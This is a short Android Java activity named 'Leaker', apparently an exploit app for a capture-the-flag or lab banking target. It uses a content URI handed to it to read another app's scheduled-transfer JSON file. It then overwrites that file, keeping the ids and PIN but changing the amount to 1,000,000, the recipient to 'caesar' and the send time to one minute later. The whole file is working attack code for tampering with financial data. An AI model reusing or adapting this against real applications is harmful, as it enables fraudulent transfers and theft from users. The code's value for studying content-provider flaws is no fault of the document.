package com.example.rob_koko;

import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import android.os.ParcelFileDescriptor;
import android.util.Log;
import android.widget.TextView;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class Leaker extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_leaker);
        TextView fp = findViewById(R.id.filepath);
        TextView ori = findViewById(R.id.original);
        TextView cus = findViewById(R.id.custom);

        Uri folder_path = getIntent().getData();
        String file_name = "", file_path = "";
        StringBuilder fileContent = new StringBuilder();

        // Get file name
        try {
            if (folder_path != null) {

                Cursor cursor = getContentResolver().query(folder_path, null, null, null, null);
                if (cursor != null && cursor.moveToFirst()){
                    do {
                        file_name = cursor.getString(cursor.getColumnIndexOrThrow("name"));
                        file_path = folder_path.toString() + '/' + file_name;
                        fp.setText(file_path);
                    } while (cursor.moveToNext());

                    if (cursor != null) cursor.close();
                }
            }
        } catch (Exception e) {
            Log.e("Error: ", e.getMessage());
        }

        // Get file content
        try {
            ParcelFileDescriptor pfd = getContentResolver().openFileDescriptor(Uri.parse(file_path), "r");

            if (pfd != null) {
                FileInputStream inputStream = new FileInputStream(pfd.getFileDescriptor());

                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line;
                while ((line = reader.readLine()) != null) {
                    fileContent.append(line).append("\n");
                    ori.setText(fileContent.toString());
                }
                reader.close();
                pfd.close();
            }

        } catch (Exception e) {
            Log.e("Error: ", e.getMessage());
        }

        // Overwrite the json file with custom json object
        try {
            LocalDateTime time = LocalDateTime.now().plusMinutes(1);
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String new_time = time.format(formatter);

            JSONObject original = new JSONObject(fileContent.toString());
            JSONObject custom = new JSONObject();
            custom.put("amount", 1000000.0);
            custom.put("createdAt", original.getString("createdAt"));
            custom.put("fromUserId", original.getInt("fromUserId"));
            custom.put("id", original.getString("id"));
            custom.put("message", "5ly balk mn flosak");
            custom.put("pin", original.getString("pin"));
            custom.put("scheduledTime", new_time);
            custom.put("toUsername", "caesar");
            custom.put("type", original.getString("type"));

            OutputStream os = getContentResolver().openOutputStream(Uri.parse(file_path), "wt");
            os.write(custom.toString().getBytes());
            os.close();

            cus.setText(custom.toString());
        } catch (Exception e) {
            Log.e("Error: ", e.getMessage());
        }

    }
}